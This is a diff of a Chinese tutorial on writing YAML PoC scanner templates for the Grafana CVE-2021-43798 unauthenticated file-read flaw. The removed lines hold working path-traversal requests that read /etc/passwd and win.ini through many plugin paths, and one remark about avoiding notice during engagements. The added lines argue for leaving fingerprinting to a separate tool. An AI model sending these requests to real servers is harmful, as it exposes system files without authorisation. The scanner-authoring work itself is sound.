@@ -224,81 +224,14 @@ detail:
         - https://github.com/vulhub/vulhub/blob/master/grafana/CVE-2021-43798/README.zh-cn.md
 ```
 ### 优化三（Optimisation Three）
-就目前的POC来看，基本已经覆盖了绝大多数的情况，这个时候我们可以考虑一下发包的问题。因为我们的POC目前是对每一个目标都会发，甚至目录上下文发生了改变也会发，所有如果该POC加入到扫描阵列中的时候，在对不是grafana的目标的每一个不同的目录上下文都会发送80个数据包，而这些数据包全是无用的，这无疑会拖慢扫描速度，同时测试目标也会收到很多重复探测的数据包，在对抗中将很容易会被发现。所以接下来我们需要加一个探测规则，在确认了是grafana后，再去探测漏洞，从而减少无效包的发送。
-```yaml
-name: poc-yaml-grafana-cve-2021-43798-unauth-fileread-test-4
-manual: true
-transport: http
-rules:
-    detect:
-        request:
-            cache: false
-            method: GET
-            path: /
-            follow_redirects: true
-        expression: |
-            response.status == 200 && "window.grafana[b|B]oot[d|D]ata\\s*=\\s*{".matches(response.body_string) || response.body_string.contains("Sometimes restarting grafana-server can help")
-    r0:
-        request:
-            cache: true
-            method: GET
-            path: /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
-        expression: |
-            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
-    r1:
-        request:
-            cache: true
-            method: GET
-            path: /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
-        expression: |
-            response.status == 200 && response.body_string.contains("for 16-bit app support")
-    r2:
-        request:
-            cache: true
-            method: GET
-            path: /public/plugins/annolist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
-        expression: |
-            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
-    r3:
-        request:
-            cache: true
-            method: GET
-            path: /public/plugins/annolist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
-        expression: |
-            response.status == 200 && response.body_string.contains("for 16-bit app support")
-    r4:
-        request:
-            cache: true
-            method: GET
-            path: /public/plugins/grafana-azure-monitor-datasource/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
-        expression: |
-            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
-    r5:
-        request:
-            cache: true
-            method: GET
-            path: /public/plugins/grafana-azure-monitor-datasource/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
-        expression: |
-            response.status == 200 && response.body_string.contains("for 16-bit app support")
-    r6:
-        request:
-            cache: true
-            method: GET
-            path: /public/plugins/barchart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
-        expression: |
-            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
-    r7:
-        ...
-expression: |
-    detect() && (r0() || r1() || r2() || r3() || r4() || r5() || r6() || r7() || r8() || r9() || r10() || r11() || r12() || r13() || r14() || r15() || r16() || r17() || r18() || r19() || r20() || r21() || r22() || r23() || r24() || r25() || r26() || r27() || r28() || r29() || r30() || r31() || r32() || r33() || r34() || r35() || r36() || r37() || r38() || r39() || r40() || r41() || r42() || r43() || r44() || r45() || r46() || r47() || r48() || r49() || r50() || r51() || r52() || r53() || r54() || r55() || r56() || r57() || r58() || r59() || r60() || r61() || r62() || r63() || r64() || r65() || r66() || r67() || r68() || r69() || r70() || r71() || r72() || r73() || r74() || r75() || r76() || r77() || r78() || r79())
-detail:
-    author: test
-    links:
-        - https://github.com/vulhub/vulhub/blob/master/grafana/CVE-2021-43798/README.zh-cn.md
-```
-通过添加这样的探测规则，即可规避多数发送无效包的情况。
-### 优化四（Optimisation Four）
-由于这个POC的规则绝大多数都是重复的内容，每个规则只有一点不同的地方，所以我们可以使用payload这个关键字对POC整体进行优化，提高POC的可读性
+就目前的POC来看，基本已经覆盖了绝大多数的情况，这个时候我们可以考虑一下发包的问题。首先此处需要确认一个原则：
+
+<Tip>产品检测相关的逻辑交给指纹识别工具（xapp），漏洞本身的特征检测交给 poc 本身</Tip>
+
+- 也就是说我们不需要将产品指纹相关的内容放置到poc中作为check规则，这些内容应该交给专门的工具，比如xapp去实现，这样解耦，工具之间才能更灵活的调度，也不会出现发包过多的问题
+- 而像`存在某个路径/文件，这个漏洞才存在`这种情况，去写一个check规则来降低发包量是完全合理的。
+
+对于这个漏洞来说，没有什么明显的特征，所以优化为下述内容即可
 ```yaml
 name: poc-yaml-grafana-cve-2021-43798-unauth-fileread
 transport: http
@@ -347,14 +280,6 @@ payloads:
             re: |
                 "root:.*?:[0-9]*:[0-9]*:"
 rules:
-    detect:
-        request:
-            cache: false
-            method: GET
-            path: /
-            follow_redirects: true
-        expression: |
-            response.status == 200 && "window.grafana[b|B]oot[d|D]ata\\s*=\\s*{".matches(response.body_string) || response.body_string.contains("Sometimes restarting grafana-server can help")
     r0:
         request:
             method: GET
@@ -367,4 +292,3 @@ detail:
     links:
         - https://github.com/vulhub/vulhub/blob/master/grafana/CVE-2021-43798/README.zh-cn.md
 ```
-通过这种方式，当我们在类似sublime等的编辑器中查看的时候，就可以直接将payload隐藏起来，直接看该POC的逻辑即可。
